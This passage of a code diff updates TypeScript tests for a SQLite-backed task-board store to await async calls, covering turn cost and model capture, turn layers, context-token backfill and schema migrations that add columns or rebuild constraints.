 			{ endedAt: turn.startedAt + 1000, failed: false, cost: 0.75 },
 		]);
-		reopened.close();
+		await reopened.close();
 		// A second open is idempotent: filled turns are not re-read.
-		expect(open(dir).perfFacts().turns).toEqual([
+		expect((await (await open(dir)).perfFacts()).turns).toEqual([
 			{ endedAt: turn.startedAt + 1000, failed: false, cost: 0.75 },
 		]);
 	});
 
-	test("open adds the cost columns to a database created before them", () => {
+	test("open adds the cost columns to a database created before them", async () => {
 		const dir = join(root, "cost-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const legacy = new Database(join(dir, ".tasks", "tasks.db"), {
@@ -1931,13 +2063,13 @@ describe("turn cost capture", () => {
 			"CREATE TABLE turns (id INTEGER PRIMARY KEY AUTOINCREMENT, task_id TEXT NOT NULL, kind TEXT NOT NULL, prompt TEXT NOT NULL, started_at INTEGER NOT NULL, ended_at INTEGER, pid INTEGER, exit_code INTEGER, outcome TEXT, summary TEXT, details TEXT, question TEXT, error TEXT)",
 		);
 		legacy.close();
-		const store = open(dir);
-		const t = store.createTask("legacy cost");
-		const turn = store.startTurn(t.id, "work", "p", null);
+		const store = await open(dir);
+		const t = await store.createTask("legacy cost");
+		const turn = await store.startTurn(t.id, "work", "p", null);
 		// The capture path runs against the freshly added columns without throwing.
-		store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
-		expect(store.perfFacts().turns).toHaveLength(1);
-		store.close();
+		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
+		expect((await store.perfFacts()).turns).toHaveLength(1);
+		await store.close();
 		const raw = new Database(join(dir, ".tasks", "tasks.db"));
 		const cols = raw
 			.query<{ name: string }, []>("PRAGMA table_info(turns)")
@@ -1956,11 +2088,11 @@ describe("turn cost capture", () => {
 });
 
 describe("turn dispatched model (provider fallback)", () => {
-	test("a settled swap keeps the served model and the dispatched selector", () => {
-		const store = open(join(root, "turn-swap-settled"));
-		const task = store.createTask("fallback pick");
+	test("a settled swap keeps the served model and the dispatched selector", async () => {
+		const store = await open(join(root, "turn-swap-settled"));
+		const task = await store.createTask("fallback pick");
 		// startTurn snapshots the dispatch: the --model this run starts with.
-		const turn = store.startTurn(
+		const turn = await store.startTurn(
 			task.id,
 			"work",
 			"p",
@@ -1970,22 +2102,22 @@ describe("turn dispatched model (provider fallback)", () => {
 		);
 		expect(turn.model).toBe("anthropic/claude-opus-5-5:medium");
 		expect(turn.dispatchedModel).toBeNull();
-		store.finishTurn(turn.id, {
+		await store.finishTurn(turn.id, {
 			endedAt: turn.startedAt + 1000,
 			// The stream served another model: omp's retry chain fell back.
 			model: "zai/glm-5.3",
 			dispatchedModel: "anthropic/claude-opus-5-5:medium",
 		});
-		const [settled] = store.listTurns(task.id);
+		const [settled] = await store.listTurns(task.id);
 		expect(settled?.model).toBe("zai/glm-5.3");
 		expect(settled?.dispatchedModel).toBe("anthropic/claude-opus-5-5:medium");
-		store.close();
+		await store.close();
 	});
 
-	test("a settle without a swap leaves the dispatched selector null", () => {
-		const store = open(join(root, "turn-swap-clean"));
-		const task = store.createTask("steady pick");
-		const turn = store.startTurn(
+	test("a settle without a swap leaves the dispatched selector null", async () => {
+		const store = await open(join(root, "turn-swap-clean"));
+		const task = await store.createTask("steady pick");
+		const turn = await store.startTurn(
 			task.id,
 			"work",
 			"p",
@@ -1993,17 +2125,17 @@ describe("turn dispatched model (provider fallback)", () => {
 			null,
 			"zai/glm-5.3-flash:max",
 		);
-		store.finishTurn(turn.id, {
+		await store.finishTurn(turn.id, {
 			endedAt: turn.startedAt + 1000,
 			model: "zai/glm-5.3-flash",
 		});
-		const [settled] = store.listTurns(task.id);
+		const [settled] = await store.listTurns(task.id);
 		expect(settled?.model).toBe("zai/glm-5.3-flash");
 		expect(settled?.dispatchedModel).toBeNull();
-		store.close();
+		await store.close();
 	});
 
-	test("open adds dispatched_model to a database created before it", () => {
+	test("open adds dispatched_model to a database created before it", async () => {
 		const dir = join(root, "swap-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const legacy = new Database(join(dir, ".tasks", "tasks.db"), {
@@ -2014,18 +2146,18 @@ describe("turn dispatched model (provider fallback)", () => {
 			"CREATE TABLE turns (id INTEGER PRIMARY KEY AUTOINCREMENT, task_id TEXT NOT NULL, kind TEXT NOT NULL, prompt TEXT NOT NULL, started_at INTEGER NOT NULL, ended_at INTEGER, pid INTEGER, exit_code INTEGER, outcome TEXT, summary TEXT, details TEXT, question TEXT, error TEXT, model TEXT)",
 		);
 		legacy.close();
-		const store = open(dir);
-		const task = store.createTask("legacy swap");
-		const turn = store.startTurn(task.id, "work", "p", null);
+		const store = await open(dir);
+		const task = await store.createTask("legacy swap");
+		const turn = await store.startTurn(task.id, "work", "p", null);
 		// The swap path runs against the freshly added column without throwing.
-		store.finishTurn(turn.id, {
+		await store.finishTurn(turn.id, {
 			endedAt: turn.startedAt + 1000,
 			dispatchedModel: "anthropic/claude-opus-5-5:medium",
 		});
-		expect(store.listTurns(task.id)[0]?.dispatchedModel).toBe(
+		expect((await store.listTurns(task.id))[0]?.dispatchedModel).toBe(
 			"anthropic/claude-opus-5-5:medium",
 		);
-		store.close();
+		await store.close();
 		const raw = new Database(join(dir, ".tasks", "tasks.db"));
 		const cols = raw
 			.query<{ name: string }, []>("PRAGMA table_info(turns)")
@@ -2037,12 +2169,12 @@ describe("turn dispatched model (provider fallback)", () => {
 });
 
 describe("turn layer", () => {
-	test("startTurn persists and returns the layer; the default stays null", () => {
-		const store = open(join(root, "turn-layer-basic"));
-		const task = store.createTask("layered things");
-		const flat = store.startTurn(task.id, "work", "p", null);
+	test("startTurn persists and returns the layer; the default stays null", async () => {
+		const store = await open(join(root, "turn-layer-basic"));
+		const task = await store.createTask("layered things");
+		const flat = await store.startTurn(task.id, "work", "p", null);
 		expect(flat.layer).toBeNull();
-		const pinned = store.startTurn(
+		const pinned = await store.startTurn(
 			task.id,
 			"work",
 			"p",
@@ -2054,17 +2186,17 @@ describe("turn layer", () => {
 		);
 		expect(pinned.layer).toBe("abc123");
 		// The read-back row carries it: a fresh list sees the stored layer too.
-		expect(store.listTurns(task.id).map((t) => t.layer)).toEqual([
+		expect((await store.listTurns(task.id)).map((t) => t.layer)).toEqual([
 			null,
 			"abc123",
 		]);
-		store.close();
+		await store.close();
 	});
 
-	test("listOpenTurnLayers returns distinct layers of open turns only", () => {
-		const store = open(join(root, "turn-layer-open"));
-		const task = store.createTask("open layers");
-		const a = store.startTurn(
+	test("listOpenTurnLayers returns distinct layers of open turns only", async () => {
+		const store = await open(join(root, "turn-layer-open"));
+		const task = await store.createTask("open layers");
+		const a = await store.startTurn(
 			task.id,
 			"work",
 			"p",
@@ -2074,7 +2206,7 @@ describe("turn layer", () => {
 			null,
 			"a",
 		);
-		const a2 = store.startTurn(
+		const a2 = await store.startTurn(
 			task.id,
 			"work",
 			"p",
@@ -2084,7 +2216,7 @@ describe("turn layer", () => {
 			null,
 			"a",
 		); // dup layer
-		const b = store.startTurn(
+		const b = await store.startTurn(
 			task.id,
 			"work",
 			"p",
@@ -2094,17 +2226,17 @@ describe("turn layer", () => {
 			null,
 			"b",
 		);
-		store.startTurn(task.id, "work", "p", null); // flat, never listed
-		store.finishTurn(a.id, { endedAt: Date.now() }); // one "a" turn finished...
-		expect(store.listOpenTurnLayers()).toEqual(["a", "b"]); // ...its dup still holds "a"
-		store.finishTurn(a2.id, { endedAt: Date.now() });
-		expect(store.listOpenTurnLayers()).toEqual(["b"]);
-		store.finishTurn(b.id, { endedAt: Date.now() });
-		expect(store.listOpenTurnLayers()).toEqual([]);
-		store.close();
+		await store.startTurn(task.id, "work", "p", null); // flat, never listed
+		await store.finishTurn(a.id, { endedAt: Date.now() }); // one "a" turn finished...
+		expect(await store.listOpenTurnLayers()).toEqual(["a", "b"]); // ...its dup still holds "a"
+		await store.finishTurn(a2.id, { endedAt: Date.now() });
+		expect(await store.listOpenTurnLayers()).toEqual(["b"]);
+		await store.finishTurn(b.id, { endedAt: Date.now() });
+		expect(await store.listOpenTurnLayers()).toEqual([]);
+		await store.close();
 	});
 
-	test("open adds the layer column to a database created before it", () => {
+	test("open adds the layer column to a database created before it", async () => {
 		const dir = join(root, "layer-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const legacy = new Database(join(dir, ".tasks", "tasks.db"), {
@@ -2118,9 +2250,9 @@ describe("turn layer", () => {
 			"INSERT INTO turns (task_id, kind, prompt, started_at) VALUES ('leg1', 'work', 'old turn', 1)",
 		);
 		legacy.close();
-		const store = open(dir);
-		const task = store.createTask("after layer migration");
-		const turn = store.startTurn(
+		const store = await open(dir);
+		const task = await store.createTask("after layer migration");
+		const turn = await store.startTurn(
 			task.id,
 			"work",
 			"p",
@@ -2132,10 +2264,10 @@ describe("turn layer", () => {
 		);
 		expect(turn.layer).toBe("fresh-layer");
 		// The pre-migration row reads as null (flat-home era), not as an error.
-		expect(store.listTurns(task.id).map((t) => t.layer)).toEqual([
+		expect((await store.listTurns(task.id)).map((t) => t.layer)).toEqual([
 			"fresh-layer",
 		]);
-		store.close();
+		await store.close();
 		const raw = new Database(join(dir, ".tasks", "tasks.db"));
 		expect(
 			raw
@@ -2189,76 +2321,89 @@ describe("done task context capture", () => {
 		return row?.context_tokens ?? null;
 	}
 
-	test("finishTurn stores the session's final context tokens", () => {
+	test("finishTurn stores the session's final context tokens", async () => {
 		const dir = join(root, "context-finish");
-		const store = open(dir);
-		const t = store.updateTask(store.createTask("contextful").id, {
-			sessionId: sid,
-		});
-		const turn = store.startTurn(t.id, "work", "p", null);
+		const store = await open(dir);
+		const t = await store.updateTask(
+			(await store.createTask("contextful")).id,
+			{
+				sessionId: sid,
+			},
+		);
+		const turn = await store.startTurn(t.id, "work", "p", null);
 		// The last snapshot wins: an earlier smaller reading, then the final one.
 		writeTranscript(store.sessionsDir, sid, [
 			contextLine(turn.startedAt + 100, 10_000),
 			contextLine(turn.startedAt + 2000, 250_000),
 		]);
-		store.finishTurn(turn.id, { endedAt: turn.startedAt + 3000 });
-		expect(store.perfFacts().tasks[0]?.contextTokens).toBe(250_000);
-		store.close();
+		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 3000 });
+		expect((await store.perfFacts()).tasks[0]?.contextTokens).toBe(250_000);
+		await store.close();
 		expect(storedContext(dir)).toBe(250_000);
 	});
 
-	test("a turn without a transcript keeps the column NULL, a later turn refreshes it", () => {
+	test("a turn without a transcript keeps the column NULL, a later turn refreshes it", async () => {
 		const dir = join(root, "context-refresh");
-		const store = open(dir);
-		const t = store.updateTask(store.createTask("late file").id, {
+		const store = await open(dir);
+		const t = await store.updateTask((await store.createTask("late file")).id, {
 			sessionId: sid,
 		});
-		const a = store.startTurn(t.id, "work", "p", null);
-		store.finishTurn(a.id, { endedAt: a.startedAt + 1000 });
-		expect(store.perfFacts().tasks[0]?.contextTokens).toBeNull();
+		const a = await store.startTurn(t.id, "work", "p", null);
+		await store.finishTurn(a.id, { endedAt: a.startedAt + 1000 });
+		expect((await store.perfFacts()).tasks[0]?.contextTokens).toBeNull();
 		writeTranscript(store.sessionsDir, sid, [
 			contextLine(a.startedAt + 2000, 300_000),
 		]);
-		const b = store.startTurn(t.id, "work", "p2", null);
-		store.finishTurn(b.id, { endedAt: b.startedAt + 1000 });
-		expect(store.perfFacts().tasks[0]?.contextTokens).toBe(300_000);
-		store.close();
+		const b = await store.startTurn(t.id, "work", "p2", null);
+		await store.finishTurn(b.id, { endedAt: b.startedAt + 1000 });
+		expect((await store.perfFacts()).tasks[0]?.contextTokens).toBe(300_000);
+		await store.close();
 	});
 
-	test("reopen backfills a done task's reading once its transcript exists", () => {
+	test("reopen backfills a done task's reading once its transcript exists", async () => {
 		const dir = join(root, "context-backfill");
-		const store = open(dir);
-		const t = store.updateTask(store.createTask("done later").id, {
-			sessionId: sid,
-		});
-		const turn = store.startTurn(t.id, "work", "p", null);
-		store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 }); // no file yet
-		store.updateTask(t.id, { stage: "done" });
-		store.close();
+		const store = await open(dir);
+		const t = await store.updateTask(
+			(await store.createTask("done later")).id,
+			{
+				sessionId: sid,
+			},
+		);
+		const turn = await store.startTurn(t.id, "work", "p", null);
+		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 }); // no file yet
+		await store.updateTask(t.id, { stage: "done" });
+		await store.close();
 		expect(storedContext(dir)).toBeNull();
 		writeTranscript(store.sessionsDir, sid, [
 			contextLine(turn.startedAt + 900, 128_000),
 		]);
-		const reopened = open(dir);
-		expect(reopened.perfFacts().tasks[0]?.contextTokens).toBe(128_000);
-		reopened.close();
+		const reopened = await open(dir);
+		expect((await reopened.perfFacts()).tasks[0]?.contextTokens).toBe(128_000);
+		await reopened.close();
 		// A second open is idempotent: filled tasks are not re-read.
-		expect(open(dir).perfFacts().tasks[0]?.contextTokens).toBe(128_000);
+		expect((await (await open(dir)).perfFacts()).tasks[0]?.contextTokens).toBe(
+			128_000,
+		);
 	});
 
-	test("only done tasks backfill; a missing transcript keeps NULL", () => {
+	test("only done tasks backfill; a missing transcript keeps NULL", async () => {
 		const dir = join(root, "context-skip");
 		const missingSid = "eeee0000-0000-0000-0000-000000000402";
-		const store = open(dir);
+		const store = await open(dir);
 		// The running card's transcript exists on disk, the done card's does not.
-		store.updateTask(store.createTask("still open").id, { sessionId: sid });
-		const done = store.updateTask(store.createTask("no transcript").id, {
-			sessionId: missingSid,
+		await store.updateTask((await store.createTask("still open")).id, {
+			sessionId: sid,
 		});
-		store.updateTask(done.id, { stage: "done" });
-		store.close();
+		const done = await store.updateTask(
+			(await store.createTask("no transcript")).id,
+			{
+				sessionId: missingSid,
+			},
+		);
+		await store.updateTask(done.id, { stage: "done" });
+		await store.close();
 		writeTranscript(store.sessionsDir, sid, [contextLine(1, 64_000)]);
-		const facts = open(dir).perfFacts().tasks;
+		const facts = (await (await open(dir)).perfFacts()).tasks;
 		// The running card never backfills, even with a readable transcript.
 		expect(facts.find((f) => f.doneAt === null)?.contextTokens).toBeNull();
 		// The done card has no transcript to read.
@@ -2269,38 +2414,44 @@ describe("done task context capture", () => {
 describe("row literals and patch types", () => {
 	// Regression for R4-9: createTask/startTurn used to hand-build their return values,
 	// which could drift from the stored row and the toTask/toTurn normalizers.
-	test("createTask and startTurn return the stored rows, not hand-built literals", () => {
+	test("createTask and startTurn return the stored rows, not hand-built literals", async () => {
 		const dir = join(root, "read-back");
 		mkdirSync(dir, { recursive: true });
 		// Create the real schema first (ProjectStore.init makes dir and tables), then add
 		// the trigger to that live schema so it exists before any row is inserted.
-		open(dir).close();
+		await (await open(dir)).close();
 		// A trigger rewrites the stored title behind the store's back; a literal return misses it.
 		const raw = new Database(join(dir, ".tasks", "tasks.db"));
 		raw.exec(
 			"CREATE TRIGGER stamp AFTER INSERT ON tasks BEGIN UPDATE tasks SET title = title || '!' WHERE rowid = new.rowid; END",
 		);
 		raw.close();
-		const store = open(dir);
-		const task = store.createTask("read me back", "glm");
+		const store = await open(dir);
+		const task = await store.createTask("read me back", "glm");
 		expect(task.title).toBe("read me back!");
-		expect(store.getTask(task.id)).toEqual(task);
-		const turn = store.startTurn(task.id, "work", "read me back", 4242, "in");
-		const storedTurn = store.listTurns(task.id)[0];
+		expect(await store.getTask(task.id)).toEqual(task);
+		const turn = await store.startTurn(
+			task.id,
+			"work",
+			"read me back",
+			4242,
+			"in",
+		);
+		const storedTurn = (await store.listTurns(task.id))[0];
 		expect(storedTurn).toBeDefined();
 		expect(storedTurn).toEqual(turn);
-		store.close();
+		await store.close();
 	});
 
 	// Regression for R4-8: doneAt used to be accepted by updateTask and silently dropped
 	// (TASK_COLUMNS has no mapping). The patch type now rejects it at compile time.
-	test("updateTask ignores fields only the store may write", () => {
-		const store = open(join(root, "patch-type"));
-		const t = store.createTask("typed");
+	test("updateTask ignores fields only the store may write", async () => {
+		const store = await open(join(root, "patch-type"));
+		const t = await store.createTask("typed");
 		// @ts-expect-error TaskPatch excludes doneAt: done_at is stamped internally on entering Done
-		store.updateTask(t.id, { doneAt: 123 });
-		expect(store.getTask(t.id)?.doneAt).toBeNull();
-		store.close();
+		await store.updateTask(t.id, { doneAt: 123 });
+		expect((await store.getTask(t.id))?.doneAt).toBeNull();
+		await store.close();
 	});
 });
 
@@ -2337,7 +2488,84 @@ describe("preparing migration", () => {
 		done_at INTEGER
 	)`;
 
-	test("open adds the follow-up PR columns to an old-schema tasks table", () => {
+	const laterTaskFields = {
+		pushSha: "check-migration-head",
+		promptAuthor: "board" as const,
+		findingsCheckedAt: 123,
+		gate: { hash: null, seen: null, fails: 2, sig: null, parked: true },
+		uncommittedFiles: ["src/retained.ts"],
+	};
+	const laterSettings = {
+		displayName: "Migrated board",
+		releaseCommand: "bun run release",
+		issueWatch: true,
+		issueWatchSince: 101,
+	};
+
+	async function writeLaterRebuildFields(store: ProjectStore): Promise<void> {
+		const sessionId = "eeee0000-0000-0000-0000-000000000901";
+		await store.updateTask("seed1", { ...laterTaskFields, sessionId });
+		await store.setSettings(laterSettings);
+		const turn = await store.startTurn(
+			"seed1",
+			"work",
+			"CHECK migration context",
+			null,
+		);
+		mkdirSync(store.sessionsDir, { recursive: true });
+		writeFileSync(
+			join(store.sessionsDir, `2026-09-27T10-00-00-000Z_${sessionId}.jsonl`),
+			`${JSON.stringify({
+				type: "message",
+				timestamp: new Date(turn.startedAt + 100).toISOString(),
+				message: {
+					role: "assistant",
+					provider: "zai",
+					model: "test/model",
+					usage: {},
+					contextSnapshot: { promptTokens: 64000, compactionEpoch: 0 },
+				},
+			})}\n`,
+		);
+		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 200 });
+	}
+
+	async function expectLaterRebuildFields(store: ProjectStore): Promise<void> {
+		expect(await store.getTask("seed1")).toMatchObject(laterTaskFields);
+		expect(await store.getSettings()).toMatchObject(laterSettings);
+		const facts = await store.perfFacts();
+		expect(facts.tasks.find((task) => task.id === "seed1")?.contextTokens).toBe(
+			64000,
+		);
+		const turns = await store.listTurns("seed1");
+		expect(turns).toHaveLength(1);
+		expect(turns[0]?.prompt).toBe("CHECK migration context");
+		expect(turns[0]?.endedAt).toBe(turns[0]!.startedAt + 200);
+	}
+
+	async function expectCheckSchemaMatchesFresh(dir: string): Promise<void> {
+		const freshDir = `${dir}-fresh-schema`;
+		const fresh = await open(freshDir);
+		await fresh.close();
+		const migratedDb = new Database(join(dir, ".tasks", "tasks.db"));
+		const freshDb = new Database(join(freshDir, ".tasks", "tasks.db"));
+		try {
+			for (const table of ["tasks", "turns", "settings"]) {
+				const columns = (db: Database) =>
+					db
+						.query<{ name: string }, []>(`PRAGMA table_info(${table})`)
+						.all()
+						.map((column) => column.name)
+						.sort();
+				expect(columns(migratedDb)).toEqual(columns(freshDb));
+			}
+		} finally {
+			migratedDb.close();
+			freshDb.close();
+		}
+	}
+
+	test("open adds the follow-up PR columns to an old-schema tasks table", async () => {
 		const dir = join(root, "followup-pr-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
@@ -2366,27 +2594,27 @@ describe("preparing migration", () => {
 		);
 		db.close();
 
-		const store = open(dir);
-		store.updateTask("seed1", {
+		const store = await open(dir);
+		await store.updateTask("seed1", {
 			followUpPrNumber: 33,
 			followUpPrUrl: "https://github.com/acme/repo/pull/33",
 		});
-		const after = store.getTask("seed1");
+		const after = await store.getTask("seed1");
 		expect(after?.followUpPrNumber).toBe(33);
 		expect(after?.followUpPrUrl).toBe("https://github.com/acme/repo/pull/33");
 		// The columns read null for a row that never held a follow-up PR.
-		const plain = store.getTask("seed2");
+		const plain = await store.getTask("seed2");
 		expect(plain?.followUpPrNumber).toBe(null);
 		expect(plain?.followUpPrUrl).toBe(null);
-		store.close();
+		await store.close();
 
 		// The columns are durable across a reopen.
-		const reopened = open(dir);
-		expect(reopened.getTask("seed1")?.followUpPrNumber).toBe(33);
-		reopened.close();
+		const reopened = await open(dir);
+		expect((await reopened.getTask("seed1"))?.followUpPrNumber).toBe(33);
+		await reopened.close();
 	});
 
-	test("open rebuilds the old state CHECK without losing rows and accepts preparing", () => {
+	test("open rebuilds the old state CHECK without losing rows and accepts preparing", async () => {
 		const dir = join(root, "preparing-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
@@ -2396,28 +2624,32 @@ describe("preparing migration", () => {
 		);
 		db.close();
 
-		const store = open(dir);
-		expect(store.getTask("seed1")?.title).toBe("seeded");
-		expect(store.getTask("seed1")?.state).toBe("running");
+		const store = await open(dir);
+		expect((await store.getTask("seed1"))?.title).toBe("seeded");
+		expect((await store.getTask("seed1"))?.state).toBe("running");
 		// The old CHECK rejected exactly this write — the crash from the screenshot.
-		store.updateTask("seed1", { state: "preparing" });
-		expect(store.getTask("seed1")?.state).toBe("preparing");
-		const fresh = store.createTask("after migration");
-		expect(store.getTask(fresh.id)?.state).toBe("queued");
-		store.close();
+		await store.updateTask("seed1", { state: "preparing" });
+		expect((await store.getTask("seed1"))?.state).toBe("preparing");
+		const fresh = await store.createTask("after migration");
+		expect((await store.getTask(fresh.id))?.state).toBe("queued");
+		await writeLaterRebuildFields(store);
+		await expectLaterRebuildFields(store);
+		await store.close();
+		await expectCheckSchemaMatchesFresh(dir);
 
 		// The constraint change is durable across a reopen.
-		const reopened = open(dir);
-		expect(reopened.getTask("seed1")?.state).toBe("preparing");
-		reopened.close();
+		const reopened = await open(dir);
+		expect((await reopened.getTask("seed1"))?.state).toBe("preparing");
+		await expectLaterRebuildFields(reopened);
+		await reopened.close();
 	});
 
-	test("open rebuilds the old stage CHECK without losing rows and accepts backlog", () => {
+	test("open rebuilds the old stage CHECK without losing rows and accepts backlog", async () => {
 		const dir = join(root, "backlog-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		// The current column set with the pre-backlog stage list: what open() must rebuild.
-		const ref = open(join(root, "backlog-schema-ref"));
-		ref.close();
+		const ref = await open(join(root, "backlog-schema-ref"));
+		await ref.close();
 		const refDb = new Database(
 			join(root, "backlog-schema-ref", ".tasks", "tasks.db"),
 		);
@@ -2441,23 +2673,27 @@ describe("preparing migration", () => {
 		);
 		db.close();
 
-		const store = open(dir);
+		const store = await open(dir);
 		// The named-column copy kept the values the DDL's tail columns hold.
-		expect(store.getTask("seed1")?.topic).toBe("auth");
-		expect(store.getTask("seed1")?.queuedAt).toBe(5);
-		expect(store.getTask("seed1")?.workCheckLog).toEqual([]);
+		expect((await store.getTask("seed1"))?.topic).toBe("auth");
+		expect((await store.getTask("seed1"))?.queuedAt).toBe(5);
+		expect((await store.getTask("seed1"))?.workCheckLog).toEqual([]);
 		// The old CHECK rejected exactly this write.
-		store.updateTask("seed1", { stage: "backlog", state: "idle" });
-		expect(store.getTask("seed1")?.stage).toBe("backlog");
-		store.close();
+		await store.updateTask("seed1", { stage: "backlog", state: "idle" });
+		expect((await store.getTask("seed1"))?.stage).toBe("backlog");
+		await writeLaterRebuildFields(store);
+		await expectLaterRebuildFields(store);
+		await store.close();
+		await expectCheckSchemaMatchesFresh(dir);
 
 		// The constraint change is durable across a reopen.
-		const reopened = open(dir);
-		expect(reopened.getTask("seed1")?.stage).toBe("backlog");
-		reopened.close();
+		const reopened = await open(dir);
+		expect((await reopened.getTask("seed1"))?.stage).toBe("backlog");
+		await expectLaterRebuildFields(reopened);
+		await reopened.close();
 	});
 
-	test("open adds the topic column and backfills done rows in one pass", () => {
+	test("open adds the topic column and backfills done rows in one pass", async () => {
 		const dir = join(root, "topic-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
@@ -2474,21 +2710,21 @@ describe("preparing migration", () => {
 
 		// One open converges: the column lands after the state-CHECK rebuild, so the
 		// rebuild's named-column copy cannot drop the freshly backfilled labels.
-		const store = open(dir);
-		expect(store.getTask("t1")?.topic).toBe("login"); // df 6 beats auth's 4
-		expect(store.getTask("t2")?.topic).toBe("login");
-		expect(store.getTask("t3")?.topic).toBe("harden"); // highest-df pick: harden 5 beats retry 4
-		expect(store.getTask("t4")?.topic).toBeNull(); // no term reaches df 3
-		expect(store.getTask("t5")?.topic).toBeNull(); // never done, never backfilled
-		store.close();
+		const store = await open(dir);
+		expect((await store.getTask("t1"))?.topic).toBe("login"); // df 6 beats auth's 4
+		expect((await store.getTask("t2"))?.topic).toBe("login");
+		expect((await store.getTask("t3"))?.topic).toBe("harden"); // highest-df pick: harden 5 beats retry 4
+		expect((await store.getTask("t4"))?.topic).toBeNull(); // no term reaches df 3
+		expect((await store.getTask("t5"))?.topic).toBeNull(); // never done, never backfilled
+		await store.close();
 
 		// Idempotent: labels survive a reopen unchanged.
-		const reopened = open(dir);
-		expect(reopened.getTask("t1")?.topic).toBe("login");
-		reopened.close();
+		const reopened = await open(dir);
+		expect((await reopened.getTask("t1"))?.topic).toBe("login");
+		await reopened.close();
 	});
 
-	test("open adds the kind column and backfills pre-kind marker cards", () => {
+	test("open adds the kind column and backfills pre-kind marker cards", async () => {
 		const dir = join(root, "kind-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
@@ -2503,155 +2739,157 @@ describe("preparing migration", () => {
 		);
 		db.close();
 
-		const store = open(dir);
-		expect(store.getTask("r1")?.kind).toBe("retro");
-		expect(store.getTask("r2")?.kind).toBe("interview");
-		expect(store.getTask("r3")?.kind).toBe("review");
+		const store = await open(dir);
+		expect((await store.getTask("r1"))?.kind).toBe("retro");
+		expect((await store.getTask("r2"))?.kind).toBe("interview");
+		expect((await store.getTask("r3"))?.kind).toBe("review");
 		// A released card keeps kind 'work': it is a release, not a review.
-		expect(store.getTask("r4")?.kind).toBe("work");
-		expect(store.getTask("r5")?.kind).toBe("work");
-		store.close();
+		expect((await store.getTask("r4"))?.kind).toBe("work");
+		expect((await store.getTask("r5"))?.kind).toBe("work");
+		await store.close();
 
 		// Idempotent across a reopen.
-		const reopened = open(dir);
-		expect(reopened.getTask("r1")?.kind).toBe("retro");
-		expect(reopened.getTask("r4")?.kind).toBe("work");
-		reopened.close();
+		const reopened = await open(dir);
+		expect((await reopened.getTask("r1"))?.kind).toBe("retro");
+		expect((await reopened.getTask("r4"))?.kind).toBe("work");
+		await reopened.close();
 	});
 
-	test("createTask with a marker prompt and no kind arg returns kind work", () => {
-		const store = open(join(root, "kind-fresh"));
+	test("createTask with a marker prompt and no kind arg returns kind work", async () => {
+		const store = await open(join(root, "kind-fresh"));
 		for (const prompt of [
 			`${RETRO_MARKER}x`,
 			`${ARCH_REVIEW_MARKER}x`,
 			`${RULES_INTERVIEW_MARKER}x`,
 			"fix the bug",
 		]) {
-			expect(store.createTask(prompt).kind).toBe("work");
+			expect((await store.createTask(prompt)).kind).toBe("work");
 		}
-		store.close();
+		await store.close();
 	});
 
-	test("open converges pre-fix proposal reasons and keeps them on a reopen", () => {
-		const store = open(join(root, "proposal-reason-converge"));
-		const retro = store.createTask("a proposal");
-		store.updateTask(retro.id, {
+	test("open converges pre-fix proposal reasons and keeps them on a reopen", async () => {
+		const store = await open(join(root, "proposal-reason-converge"));
+		const retro = await store.createTask("a proposal");
+		await store.updateTask(retro.id, {
 			state: "needs_you",
 			needsReason:
 				"Proposed by the retro of Retro of the card. Accept to start it, edit the prompt first, or cancel to decline.",
 		});
-		const fork = store.createTask("a fork proposal");
-		store.updateTask(fork.id, {
+		const fork = await store.createTask("a fork proposal");
+		await store.updateTask(fork.id, {
 			state: "needs_you",
 			needsReason:
 				"Proposed by the fork research Fork research: ottr-ai/ottr. Accept to start it, edit the prompt first, or cancel to decline.",
 		});
 		// A non-proposal reason must survive the pass untouched.
-		const plain = store.createTask("a crashed card");
-		store.updateTask(plain.id, {
+		const plain = await store.createTask("a crashed card");
+		await store.updateTask(plain.id, {
 			state: "needs_you",
 			needsReason: "omp exited with code 1 before finishing",
 		});
-		store.close();
+		await store.close();
 
-		const reopened = open(join(root, "proposal-reason-converge"));
-		expect(reopened.getTask(retro.id)!.needsReason).toBe(
+		const reopened = await open(join(root, "proposal-reason-converge"));
+		expect((await reopened.getTask(retro.id))!.needsReason).toBe(
 			"Proposed by the retro of the card. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
 		);
-		expect(reopened.getTask(fork.id)!.needsReason).toBe(
+		expect((await reopened.getTask(fork.id))!.needsReason).toBe(
 			"Proposed by the fork research ottr-ai/ottr. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
 		);
-		expect(reopened.getTask(plain.id)!.needsReason).toBe(
+		expect((await reopened.getTask(plain.id))!.needsReason).toBe(
 			"omp exited with code 1 before finishing",
 		);
-		reopened.close();
+		await reopened.close();
 
 		// Idempotent: the converged text survives another open unchanged.
-		const again = open(join(root, "proposal-reason-converge"));
-		expect(again.getTask(retro.id)!.needsReason).toBe(
+		const again = await open(join(root, "proposal-reason-converge"));
+		expect((await again.getTask(retro.id))!.needsReason).toBe(
 			"Proposed by the retro of the card. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
 		);
-		again.close();
+		await again.close();
 	});
 
-	test("open recovers the source id for legacy proposal reasons through the follow-up chain", () => {
-		const store = open(join(root, "proposal-reason-id"));
+	test("open recovers the source id for legacy proposal reasons through the follow-up chain", async () => {
+		const store = await open(join(root, "proposal-reason-id"));
 		// A legacy retro proposal two hops down: proposal → retro → source.
-		const source = store.createTask("the pinned session name");
-		const retro = store.createTask("a retro");
-		store.updateTask(retro.id, { followUpOf: source.id, stage: "done" });
-		const held = store.createTask("a held proposal");
-		store.updateTask(held.id, {
+		const source = await store.createTask("the pinned session name");
